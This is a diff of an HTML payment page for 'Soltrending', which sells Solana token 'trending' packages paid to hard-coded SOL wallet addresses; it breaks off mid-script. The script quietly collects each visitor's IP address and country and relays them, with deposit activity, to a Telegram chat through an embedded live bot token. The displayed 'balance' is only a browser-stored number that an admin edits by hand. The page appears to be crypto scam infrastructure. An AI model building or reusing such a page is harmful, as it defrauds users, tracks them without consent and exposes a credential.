@@ -1,5 +1,4 @@
 <!DOCTYPE html>
-
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -8,835 +7,814 @@
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
 
-```
-    body {
-        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-        min-height: 100vh;
-        padding: 20px;
-    }
-    
-    .container {
-        max-width: 600px;
-        margin: 0 auto;
-        background: rgba(255, 255, 255, 0.95);
-        border-radius: 20px;
-        padding: 30px;
-        box-shadow: 0 25px 50px rgba(0, 0, 0, 0.2);
-        position: relative;
-    }
-    
-    .balance-section {
-        position: absolute;
-        top: 15px;
-        right: 15px;
-        background: rgba(102, 126, 234, 0.1);
-        border: 2px solid #667eea;
-        border-radius: 10px;
-        padding: 12px;
-        font-size: 13px;
-        color: #333;
-        min-width: 130px;
-        text-align: center;
-        z-index: 100;
-    }
-    
-    .balance-label {
-        font-size: 11px;
-        color: #666;
-        margin-bottom: 3px;
-    }
-    
-    .balance-amount {
-        font-weight: bold;
-        color: #667eea;
-        font-size: 18px;
-        margin-bottom: 8px;
-    }
-    
-    .deposit-btn {
-        background: #28a745;
-        color: white;
-        border: none;
-        padding: 6px 10px;
-        border-radius: 5px;
-        font-size: 11px;
-        cursor: pointer;
-        width: 100%;
-        transition: background 0.3s;
-    }
-    
-    .deposit-btn:hover {
-        background: #218838;
-    }
-
-    .deposit-popup {
-        display: none;
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background: rgba(0, 0, 0, 0.7);
-        z-index: 1000;
-        justify-content: center;
-        align-items: center;
-    }
-
-    .deposit-popup.show {
-        display: flex;
-    }
-
-    .deposit-content {
-        background: white;
-        border-radius: 15px;
-        padding: 30px;
-        max-width: 400px;
-        width: 90%;
-        text-align: center;
-        position: relative;
-    }
-
-    .close-popup {
-        position: absolute;
-        top: 10px;
-        right: 15px;
-        background: none;
-        border: none;
-        font-size: 24px;
-        cursor: pointer;
-        color: #666;
-    }
-
-    .deposit-address {
-        background: #f8f9fa;
-        border: 2px solid #667eea;
-        border-radius: 10px;
-        padding: 15px;
-        margin: 15px 0;
-        font-family: monospace;
-        font-size: 12px;
-        word-break: break-all;
-        color: #333;
-    }
-
-    .copy-deposit-btn {
-        background: #667eea;
-        color: white;
-        border: none;
-        padding: 12px 25px;
-        border-radius: 8px;
-        font-size: 14px;
-        cursor: pointer;
-        margin: 10px;
-        transition: all 0.3s;
-    }
-
-    .copy-deposit-btn:hover {
-        background: #5a6fd8;
-        transform: translateY(-2px);
-    }
-
-    .logo {
-        font-size: 2.5rem;
-        font-weight: bold;
-        background: linear-gradient(135deg, #667eea, #764ba2);
-        -webkit-background-clip: text;
-        -webkit-text-fill-color: transparent;
-        text-align: center;
-        margin-bottom: 20px;
-        margin-top: 40px;
-    }
-    
-    .logo {
-        font-size: 2.5rem;
-        font-weight: bold;
-        background: linear-gradient(135deg, #667eea, #764ba2);
-        -webkit-background-clip: text;
-        -webkit-text-fill-color: transparent;
-        text-align: center;
-        margin-bottom: 30px;
-    }
-    
-    .step {
-        display: none;
-        animation: fadeIn 0.3s ease-in;
-    }
-    
-    .step.active { display: block; }
-    
-    @keyframes fadeIn {
-        from { opacity: 0; }
-        to { opacity: 1; }
-    }
-    
-    .step-dots {
-        display: flex;
-        justify-content: center;
-        margin-bottom: 30px;
-    }
-    
-    .dot {
-        width: 12px;
-        height: 12px;
-        border-radius: 50%;
-        background: #ddd;
-        margin: 0 5px;
-        transition: all 0.3s;
-    }
-    
-    .dot.active { background: #667eea; }
-    .dot.done { background: #28a745; }
-    
-    h2 {
-        color: #333;
-        margin-bottom: 20px;
-        text-align: center;
-    }
-    
-    .form-group {
-        margin-bottom: 20px;
-    }
-    
-    label {
-        display: block;
-        margin-bottom: 5px;
-        color: #555;
-        font-weight: 500;
-    }
-    
-    input, textarea {
-        width: 100%;
-        padding: 12px;
-        border: 2px solid #e1e5e9;
-        border-radius: 8px;
-        font-size: 16px;
-    }
-    
-    input:focus, textarea:focus {
-        outline: none;
-        border-color: #667eea;
-    }
-    
-    .btn {
-        background: linear-gradient(135deg, #667eea, #764ba2);
-        color: white;
-        border: none;
-        padding: 12px 25px;
-        border-radius: 8px;
-        font-size: 16px;
-        cursor: pointer;
-        margin: 5px;
-        transition: transform 0.2s;
-    }
-    
-    .btn:hover { transform: translateY(-2px); }
-    .btn:disabled { background: #ccc; cursor: not-allowed; }
-    .btn-back { background: #6c757d; }
-    .btn-paid { background: linear-gradient(135deg, #28a745, #20c997); }
-    
-    .price-grid {
-        display: grid;
-        grid-template-columns: 1fr 1fr;
-        gap: 15px;
-        margin: 20px 0;
-    }
-    
-    .price-category {
-        border: 2px solid #e1e5e9;
-        border-radius: 10px;
-        padding: 15px;
-        cursor: pointer;
-        transition: all 0.3s;
-        text-align: center;
-    }
-    
-    .price-category:hover { border-color: #667eea; }
-    .price-category.selected { border-color: #667eea; background: rgba(102, 126, 234, 0.1); }
-    
-    .price-list {
-        display: none;
-        margin-top: 20px;
-    }
-    
-    .price-list.active { display: block; }
-    
-    .price-item {
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-        padding: 12px;
-        border: 2px solid #e1e5e9;
-        border-radius: 8px;
-        margin: 8px 0;
-        cursor: pointer;
-        transition: all 0.3s;
-    }
-    
-    .price-item:hover { border-color: #667eea; }
-    .price-item.selected { border-color: #667eea; background: rgba(102, 126, 234, 0.1); }
-    
-    .sol-price {
-        font-weight: bold;
-        color: #667eea;
-    }
-    
-    .wallet-box {
-        background: #f8f9fa;
-        border-radius: 10px;
-        padding: 20px;
-        margin: 20px 0;
-        border: 2px solid #e1e5e9;
-    }
-    
-    .wallet-address {
-        background: #333;
-        color: white;
-        padding: 15px;
-        border-radius: 8px;
-        font-family: monospace;
-        word-break: break-all;
-        cursor: pointer;
-        position: relative;
-    }
-    
-    .copy-btn {
-        position: absolute;
-        top: 10px;
-        right: 10px;
-        background: #667eea;
-        color: white;
-        border: none;
-        padding: 5px 10px;
-        border-radius: 5px;
-        font-size: 12px;
-        cursor: pointer;
-    }
-    
-    .alert {
-        padding: 15px;
-        border-radius: 8px;
-        margin: 15px 0;
-    }
-    
-    .alert-success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
-    .alert-error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
-    .alert-info { background: #d1ecf1; color: #0c5460; border: 1px solid #bee5eb; }
-    
-    .loading {
-        display: inline-block;
-        width: 20px;
-        height: 20px;
-        border: 3px solid #f3f3f3;
-        border-top: 3px solid #667eea;
-        border-radius: 50%;
-        animation: spin 1s linear infinite;
-    }
-    
-    @keyframes spin {
-        0% { transform: rotate(0deg); }
-        100% { transform: rotate(360deg); }
-    }
-    
-    .user-info {
-        background: #f0f0f0;
-        padding: 10px;
-        border-radius: 5px;
-        font-size: 12px;
-        color: #666;
-        margin-bottom: 20px;
-        text-align: center;
-    }
-    
-    @media (max-width: 768px) {
-        .price-grid { grid-template-columns: 1fr; }
-        .container { margin: 10px; padding: 20px; }
-    }
-</style>
-```
-
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .balance-widget {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 10px;
+            padding: 15px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            min-width: 150px;
+            z-index: 1000;
+        }
+        
+        .balance-amount {
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: #667eea;
+            margin-bottom: 8px;
+        }
+        
+        .balance-label {
+            font-size: 0.8rem;
+            color: #666;
+            margin-bottom: 10px;
+        }
+        
+        .deposit-btn {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 5px;
+            font-size: 0.9rem;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        
+        .deposit-btn:hover {
+            transform: translateY(-2px);
+        }
+        
+        .popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.7);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+        }
+        
+        .popup {
+            background: white;
+            border-radius: 15px;
+            padding: 30px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
+        }
+        
+        .popup h3 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+        
+        .deposit-address {
+            background: #333;
+            color: white;
+            padding: 15px;
+            border-radius: 8px;
+            font-family: monospace;
+            word-break: break-all;
+            cursor: pointer;
+            position: relative;
+            margin: 15px 0;
+            font-size: 0.9rem;
+        }
+        
+        .deposit-copy-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 5px;
+            font-size: 12px;
+            cursor: pointer;
+        }
+        
+        .popup-btn {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 8px;
+            font-size: 14px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        
+        .popup-btn-secondary {
+            background: #6c757d;
+        }
+        
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.2);
+        }
+        
+        .logo {
+            font-size: 2.5rem;
+            font-weight: bold;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .step {
+            display: none;
+            animation: fadeIn 0.3s ease-in;
+        }
+        
+        .step.active { display: block; }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        .step-dots {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 30px;
+        }
+        
+        .dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: #ddd;
+            margin: 0 5px;
+            transition: all 0.3s;
+        }
+        
+        .dot.active { background: #667eea; }
+        .dot.done { background: #28a745; }
+        
+        h2 {
+            color: #333;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #555;
+            font-weight: 500;
+        }
+        
+        input, textarea {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #e1e5e9;
+            border-radius: 8px;
+            font-size: 16px;
+        }
+        
+        input:focus, textarea:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+        
+        .btn {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            margin: 5px;
+            transition: transform 0.2s;
+        }
+        
+        .btn:hover { transform: translateY(-2px); }
+        .btn:disabled { background: #ccc; cursor: not-allowed; }
+        .btn-back { background: #6c757d; }
+        .btn-paid { background: linear-gradient(135deg, #28a745, #20c997); }
+        
+        .price-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin: 20px 0;
+        }
+        
+        .price-category {
+            border: 2px solid #e1e5e9;
+            border-radius: 10px;
+            padding: 15px;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-align: center;
+        }
+        
+        .price-category:hover { border-color: #667eea; }
+        .price-category.selected { border-color: #667eea; background: rgba(102, 126, 234, 0.1); }
+        
+        .price-list {
+            display: none;
+            margin-top: 20px;
+        }
+        
+        .price-list.active { display: block; }
+        
+        .price-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px;
+            border: 2px solid #e1e5e9;
+            border-radius: 8px;
+            margin: 8px 0;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .price-item:hover { border-color: #667eea; }
+        .price-item.selected { border-color: #667eea; background: rgba(102, 126, 234, 0.1); }
+        
+        .sol-price {
+            font-weight: bold;
+            color: #667eea;
+        }
+        
+        .wallet-box {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            border: 2px solid #e1e5e9;
+        }
+        
+        .wallet-address {
+            background: #333;
+            color: white;
+            padding: 15px;
+            border-radius: 8px;
+            font-family: monospace;
+            word-break: break-all;
+            cursor: pointer;
+            position: relative;
+        }
+        
+        .copy-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 5px;
+            font-size: 12px;
+            cursor: pointer;
+        }
+        
+        .alert {
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+        }
+        
+        .alert-success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
+        .alert-error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
+        .alert-info { background: #d1ecf1; color: #0c5460; border: 1px solid #bee5eb; }
+        
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .user-info {
+            background: #f0f0f0;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        @media (max-width: 768px) {
+            .price-grid { grid-template-columns: 1fr; }
+            .container { margin: 10px; padding: 20px; }
+            .balance-widget {
+                position: relative;
+                top: 0;
+                right: 0;
+                margin-bottom: 20px;
+            }
+        }
+    </style>
 </head>
 <body>
+    <!-- Balance Widget -->
+    <div class="balance-widget">
+        <div class="balance-amount" id="balanceAmount">0.00 SOL</div>
+        <div class="balance-label">Balance</div>
+        <button class="deposit-btn" onclick="showDepositPopup()">Deposit</button>
+    </div>
+
+    <!-- Deposit Popup -->
+    <div class="popup-overlay" id="depositPopup">
+        <div class="popup">
+            <h3>💰 Deposit SOL</h3>
+            <p>Send SOL to this address to add to your balance:</p>
+            <div class="deposit-address" onclick="copyDepositAddress()">
+                6Bc8Bc3PFJKcWQVcsuD3mRrAbKTRyVBgcr4YLmEubszQ
+                <button class="deposit-copy-btn">📋 Copy</button>
+            </div>
+            <div id="depositCopyFeedback" style="color: green; margin: 10px 0; opacity: 0;">✅ Address Copied!</div>
+            <div style="font-size: 0.9rem; color: #666; margin: 15px 0;">
+                Your balance will be updated after sending SOL to this address.
+            </div>
+            <button class="popup-btn popup-btn-secondary" onclick="hideDepositPopup()">Close</button>
+        </div>
+    </div>
+
     <div class="container">
-        <div class="balance-section">
-            <div class="balance-label">SOL Balance</div>
-            <div class="balance-amount" id="userBalance">0.00</div>
-            <button class="deposit-btn" onclick="showDepositPopup()">Deposit SOL</button>
+        <div class="logo">Soltrending</div>
+        <div class="user-info" id="userInfo">Loading location...</div>
+
+        <div class="step-dots">
+            <div class="dot active" id="dot1"></div>
+            <div class="dot" id="dot2"></div>
+            <div class="dot" id="dot3"></div>
+            <div class="dot" id="dot4"></div>
         </div>
 
-```
-    <div class="logo">Soltrending</div>
-    <div class="user-info" id="userInfo">Loading location...</div>
-    
-    <div class="step-dots">
-        <div class="dot active" id="dot1"></div>
-        <div class="dot" id="dot2"></div>
-        <div class="dot" id="dot3"></div>
-        <div class="dot" id="dot4"></div>
-    </div>
-
-    <!-- Step 1: CA Submission -->
-    <div class="step active" id="step1">
-        <h2>Submit Your CA</h2>
-        <div class="form-group">
-            <label>Project Name *</label>
-            <input type="text" id="projectName" placeholder="Enter project name" required>
-        </div>
-        <div class="form-group">
-            <label>CA Address *</label>
-            <input type="text" id="caAddress" placeholder="Enter Solana contract address" required>
-        </div>
-        <div class="form-group">
-            <label>Project Logo/Photo</label>
-            <input type="file" id="projectPhoto" accept="image/*">
-            <small style="color: #666;">Upload project logo or photo (optional)</small>
-        </div>
-        <div class="form-group">
-            <label>Telegram (optional)</label>
-            <input type="text" id="telegram" placeholder="@your_telegram">
-        </div>
-        <div class="form-group">
-            <label>X/Twitter (optional)</label>
-            <input type="text" id="twitter" placeholder="@your_twitter">
-        </div>
-        <div class="form-group">
-            <label>Website (optional)</label>
-            <input type="text" id="website" placeholder="https://yourwebsite.com">
-        </div>
-        <div class="form-group">
-            <label>Project Description</label>
-            <textarea id="projectDescription" placeholder="Describe your project..." rows="3"></textarea>
-        </div>
-        <button class="btn" onclick="nextStep(1)">Continue to Pricing</button>
-    </div>
-
-    <!-- Step 2: Pricing -->
-    <div class="step" id="step2">
-        <h2>Select Trending Package</h2>
-        <div class="price-grid">
-            <div class="price-category" onclick="selectCategory('top15')">
-                <h4>🏆 Top 15 Trending</h4>
-                <p>Standard visibility</p>
+        <!-- Step 1: CA Submission -->
+        <div class="step active" id="step1">
+            <h2>Submit Your CA</h2>
+            <div class="form-group">
+                <label>Project Name *</label>
+                <input type="text" id="projectName" placeholder="Enter project name" required>
             </div>
-            <div class="price-category" onclick="selectCategory('top7')">
-                <h4>⭐ Top 7 Trending</h4>
-                <p style="color: #ff6b6b; font-weight: bold;">More effective!</p>
+            <div class="form-group">
+                <label>CA Address *</label>
+                <input type="text" id="caAddress" placeholder="Enter Solana contract address" required>
             </div>
+            <div class="form-group">
+                <label>Project Logo/Photo</label>
+                <input type="file" id="projectPhoto" accept="image/*">
+                <small style="color: #666;">Upload project logo or photo (optional)</small>
+            </div>
+            <div class="form-group">
+                <label>Telegram (optional)</label>
+                <input type="text" id="telegram" placeholder="@your_telegram">
+            </div>
+            <div class="form-group">
+                <label>X/Twitter (optional)</label>
+                <input type="text" id="twitter" placeholder="@your_twitter">
+            </div>
+            <div class="form-group">
+                <label>Website (optional)</label>
+                <input type="text" id="website" placeholder="https://yourwebsite.com">
+            </div>
+            <div class="form-group">
+                <label>Project Description</label>
+                <textarea id="projectDescription" placeholder="Describe your project..." rows="3"></textarea>
+            </div>
+            <button class="btn" onclick="nextStep(1)">Continue to Pricing</button>
         </div>
 
-        <div class="price-list" id="top15List">
-            <h4>Top 15 Trending Options:</h4>
-            <div class="price-item" onclick="selectPrice('top15_4h', 1.0)">
-                <span>4 Hours</span>
-                <span class="sol-price">1.0 SOL</span>
+        <!-- Step 2: Pricing -->
+        <div class="step" id="step2">
+            <h2>Select Trending Package</h2>
+            <div class="price-grid">
+                <div class="price-category" onclick="selectCategory('top15')">
+                    <h4>🏆 Top 15 Trending</h4>
+                    <p>Standard visibility</p>
+                </div>
+                <div class="price-category" onclick="selectCategory('top7')">
+                    <h4>⭐ Top 7 Trending</h4>
+                    <p style="color: #ff6b6b; font-weight: bold;">More effective!</p>
+                </div>
             </div>
-            <div class="price-item" onclick="selectPrice('top15_8h', 1.7)">
-                <span>8 Hours</span>
-                <span class="sol-price">1.7 SOL</span>
+
+            <div class="price-list" id="top15List">
+                <h4>Top 15 Trending Options:</h4>
+                <div class="price-item" onclick="selectPrice('top15_4h', 1.0)">
+                    <span>4 Hours</span>
+                    <span class="sol-price">1.0 SOL</span>
+                </div>
+                <div class="price-item" onclick="selectPrice('top15_8h', 1.7)">
+                    <span>8 Hours</span>
+                    <span class="sol-price">1.7 SOL</span>
+                </div>
+                <div class="price-item" onclick="selectPrice('top15_16h', 4.1)">
+                    <span>16 Hours</span>
+                    <span class="sol-price">4.1 SOL</span>
+                </div>
+                <div class="price-item" onclick="selectPrice('top15_24h', 5.2)">
+                    <span>24 Hours</span>
+                    <span class="sol-price">5.2 SOL</span>
+                </div>
             </div>
-            <div class="price-item" onclick="selectPrice('top15_16h', 4.1)">
-                <span>16 Hours</span>
-                <span class="sol-price">4.1 SOL</span>
+
+            <div class="price-list" id="top7List">
+                <h4>Top 7 Trending Options:</h4>
+                <div class="price-item" onclick="selectPrice('top7_4h', 1.5)">
+                    <span>4 Hours</span>
+                    <span class="sol-price">1.5 SOL</span>
+                </div>
+                <div class="price-item" onclick="selectPrice('top7_8h', 3.0)">
+                    <span>8 Hours</span>
+                    <span class="sol-price">3.0 SOL</span>
+                </div>
+                <div class="price-item" onclick="selectPrice('top7_16h', 5.7)">
+                    <span>16 Hours</span>
+                    <span class="sol-price">5.7 SOL</span>
+                </div>
+                <div class="price-item" onclick="selectPrice('top7_24h', 8.4)">
+                    <span>24 Hours</span>
+                    <span class="sol-price">8.4 SOL</span>
+                </div>
             </div>
-            <div class="price-item" onclick="selectPrice('top15_24h', 5.2)">
-                <span>24 Hours</span>
-                <span class="sol-price">5.2 SOL</span>
-            </div>
+
+            <div id="selectedPackage"></div>
+            <button class="btn btn-back" onclick="prevStep()">Back</button>
+            <button class="btn" onclick="nextStep(2)" id="continueBtn" disabled>Continue to Payment</button>
         </div>
 
-        <div class="price-list" id="top7List">
-            <h4>Top 7 Trending Options:</h4>
-            <div class="price-item" onclick="selectPrice('top7_4h', 1.5)">
-                <span>4 Hours</span>
-                <span class="sol-price">1.5 SOL</span>
-            </div>
-            <div class="price-item" onclick="selectPrice('top7_8h', 3.0)">
-                <span>8 Hours</span>
-                <span class="sol-price">3.0 SOL</span>
-            </div>
-            <div class="price-item" onclick="selectPrice('top7_16h', 5.7)">
-                <span>16 Hours</span>
-                <span class="sol-price">5.7 SOL</span>
-            </div>
-            <div class="price-item" onclick="selectPrice('top7_24h', 8.4)">
-                <span>24 Hours</span>
-                <span class="sol-price">8.4 SOL</span>
-            </div>
-        </div>
-
-        <div id="selectedPackage"></div>
-        <button class="btn btn-back" onclick="prevStep()">Back</button>
-        <button class="btn" onclick="nextStep(2)" id="continueBtn" disabled>Continue to Payment</button>
-    </div>
-
-    <!-- Step 3: Payment -->
-    <div class="step" id="step3">
-        <h2>SOL Payment</h2>
-        <div id="orderSummary"></div>
-        
-        <div class="wallet-box">
-            <h4>💰 Send SOL to this address:</h4>
-            <div class="wallet-address" onclick="copyWallet()">
-                DB9YZwXgNeQByab3bgJnJKrnYP7CtZGktrdnDRCLrKA3
-                <button class="copy-btn">📋 Copy</button>
-            </div>
-            <div id="copyFeedback" style="color: green; margin-top: 10px; opacity: 0;">✅ Copied!</div>
+        <!-- Step 3: Payment -->
+        <div class="step" id="step3">
+            <h2>SOL Payment</h2>
+            <div id="orderSummary"></div>
             
-            <div class="alert alert-info">
-                <strong>Instructions:</strong><br>
-                1. Copy the wallet address above<br>
-                2. Send the exact amount of SOL as requested<br>
-                3. Wait 1-2 minutes for confirmation<br>
-                4. Click "PAID" button
+            <div class="wallet-box">
+                <h4>💰 Send SOL to this address:</h4>
+                <div class="wallet-address" onclick="copyWallet()">
+                    DB9YZwXgNeQByab3bgJnJKrnYP7CtZGktrdnDRCLrKA3
+                    <button class="copy-btn">📋 Copy</button>
+                </div>
+                <div id="copyFeedback" style="color: green; margin-top: 10px; opacity: 0;">✅ Copied!</div>
+                
+                <div class="alert alert-info">
+                    <strong>Instructions:</strong><br>
+                    1. Copy the wallet address above<br>
+                    2. Send the exact amount of SOL as requested<br>
+                    3. Wait 1-2 minutes for confirmation<br>
+                    4. Click "PAID" button
+                </div>
             </div>
+
+            <button class="btn btn-back" onclick="prevStep()">Back</button>
+            <button class="btn btn-paid" onclick="checkPayment()">PAID - Check Payment</button>
         </div>
 
-        <button class="btn btn-back" onclick="prevStep()">Back</button>
-        <button class="btn btn-paid" onclick="requestPaymentApproval()">PAID - Request Approval</button>
-    </div>
-
-    <!-- Step 4: Verification -->
-    <div class="step" id="step4">
-        <h2>Payment Verification</h2>
-        <div id="paymentStatus">
-            <div class="loading"></div> Checking blockchain...
+        <!-- Step 4: Verification -->
+        <div class="step" id="step4">
+            <h2>Payment Verification</h2>
+            <div id="paymentStatus">
+                <div class="loading"></div> Checking blockchain...
+            </div>
+            <div id="finalResult"></div>
+            <button class="btn" onclick="recheckPayment()" id="recheckBtn" style="display: none;">Check Again</button>
+            <button class="btn btn-back" onclick="startOver()" id="restartBtn" style="display: none;">Start Over</button>
         </div>
-        <div id="finalResult"></div>
-        <button class="btn" onclick="recheckPayment()" id="recheckBtn" style="display: none;">Check Again</button>
-        <button class="btn btn-back" onclick="startOver()" id="restartBtn" style="display: none;">Start Over</button>
     </div>
-</div>
 
-<!-- Deposit Popup -->
-<div class="popup-overlay" id="depositPopup">
-    <div class="popup-content">
-        <div class="popup-title">💰 Deposit SOL</div>
-        <p>Send SOL to this address and contact admin to add balance:</p>
-        
-        <div class="deposit-address-box" onclick="copyDepositAddress()">
-            6Bc8Bc3PFJKcWQVcsuD3mRrAbKTRyVBgcr4YLmEubszQ
-        </div>
-        
-        <p style="color: #666; font-size: 14px; margin: 10px 0;">
-            ⚠️ Only send SOL to this address!<br>
-            Other tokens will be lost.
-        </p>
-        
-        <button class="copy-deposit-btn" onclick="copyDepositAddress()">📋 Copy Address</button>
-        <button class="close-popup-btn" onclick="closeDepositPopup()">Close</button>
-    </div>
-</div>
+    <script>
+        let currentStep = 1;
+        let selectedPackage = '';
+        let selectedPrice = 0;
+        let userCountry = 'Unknown';
+        let userIP = 'Unknown';
+        let userId = '';
+        let userBalance = 0;
 
-<!-- Deposit Popup -->
-<div class="deposit-popup" id="depositPopup">
-    <div class="deposit-content">
-        <button class="close-popup" onclick="closeDepositPopup()">&times;</button>
-        <h3>💰 Deposit SOL</h3>
-        <p>Send SOL to this address to add to your balance:</p>
-        <div class="deposit-address" id="depositAddress">
-            6Bc8Bc3PFJKcWQVcsuD3mRrAbKTRyVBgcr4YLmEubszQ
-        </div>
-        <button class="copy-deposit-btn" onclick="copyDepositAddress()">📋 Copy Address</button>
-        <p style="font-size: 12px; color: #666; margin-top: 15px;">
-            After sending SOL, contact admin to update your balance
-        </p>
-    </div>
-</div>
+        const TELEGRAM_BOT = '8429756008:AAFSQjfaFbNJDLNOE73oLVE2-ZCdc-ixZGI';
+        const TELEGRAM_CHAT = '2051249497';
 
-<script>
-    let currentStep = 1;
-    let selectedPackage = '';
-    let selectedPrice = 0;
-    let userCountry = 'Unknown';
-    let userIP = 'Unknown';
-    let userBalance = 0;
-    let userId = '';
-
-    const TELEGRAM_BOT = '8429756008:AAFSQjfaFbNJDLNOE73oLVE2-ZCdc-ixZGI';
-    const TELEGRAM_CHAT = '2051249497';
-    const DEPOSIT_WALLET = '6Bc8Bc3PFJKcWQVcsuD3mRrAbKTRyVBgcr4YLmEubszQ';
-
-    // Initialize
-    window.onload = async function() {
-        try {
-            const response = await fetch('https://ipapi.co/json/');
-            const data = await response.json();
-            userCountry = data.country_name || 'Unknown';
-            userIP = data.ip || 'Unknown';
-            userId = userIP.replace(/\./g, ''); // Simple user ID from IP
+        // Generate unique user ID
+        function generateUserId() {
+            const stored = localStorage.getItem('soltrendingUserId');
+            if (stored) return stored;
             
-            document.getElementById('userInfo').innerHTML = 
-                `🌍 ${userCountry} | 📍 ${userIP} | 🕐 ${new Date().toLocaleTimeString()}`;
-
-            // Load user balance
-            loadUserBalance();
-
-            sendTelegram(`🆕 NEW VISITOR\n🌍 ${userCountry}\n📍 ${userIP}\n🆔 User ID: ${userId}\n💰 Balance: ${userBalance} SOL\n🕐 ${new Date().toLocaleString()}`);
-        } catch (e) {
-            userId = 'unknown_' + Date.now();
-            document.getElementById('userInfo').innerHTML = '🌍 Private | 🕐 ' + new Date().toLocaleTimeString();
-            loadUserBalance();
+            const id = 'USER_' + Math.random().toString(36).substr(2, 9).toUpperCase();
+            localStorage.setItem('soltrendingUserId', id);
+            return id;
         }
-    };
 
-    function loadUserBalance() {
-        const saved = localStorage.getItem('solBalance_' + userId);
-        userBalance = saved ? parseFloat(saved) : 0;
-        document.getElementById('userBalance').textContent = userBalance.toFixed(2);
-    }
-
-    function saveUserBalance() {
-        localStorage.setItem('solBalance_' + userId, userBalance.toString());
-        document.getElementById('userBalance').textContent = userBalance.toFixed(2);
-    }
-
-    async function sendTelegram(message) {
-        try {
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT,
-                    text: message
-                })
-            });
-        } catch (e) {
-            console.log('Telegram failed:', e);
+        // Load user balance
+        function loadUserBalance() {
+            const stored = localStorage.getItem('soltrendingBalance');
+            userBalance = stored ? parseFloat(stored) : 0;
+            updateBalanceDisplay();
         }
-    }
 
-    async function sendTelegramWithButtons(message, userId, userInfo) {
-        try {
-            const keyboard = {
-                inline_keyboard: [
-                    [
-                        { text: "✅ Approve Payment", callback_data: `approve_${userId}` },
-                        { text: "❌ Decline Payment", callback_data: `decline_${userId}` }
-                    ],
-                    [
-                        { text: "💰 Add Balance", callback_data: `add_balance_${userId}` },
-                        { text: "➖ Reduce Balance", callback_data: `reduce_balance_${userId}` }
-                    ]
+        // Save user balance
+        function saveUserBalance() {
+            localStorage.setItem('soltrendingBalance', userBalance.toString());
+            updateBalanceDisplay();
+        }
+
+        // Update balance display
+        function updateBalanceDisplay() {
+            document.getElementById('balanceAmount').textContent = userBalance.toFixed(2) + ' SOL';
+        }
+
+        // Show deposit popup
+        function showDepositPopup() {
+            document.getElementById('depositPopup').style.display = 'flex';
+            sendTelegram(`💳 DEPOSIT POPUP OPENED\n👤 ${userId} (${userCountry} - ${userIP})\n💰 Current Balance: ${userBalance} SOL`);
+        }
+
+        // Hide deposit popup
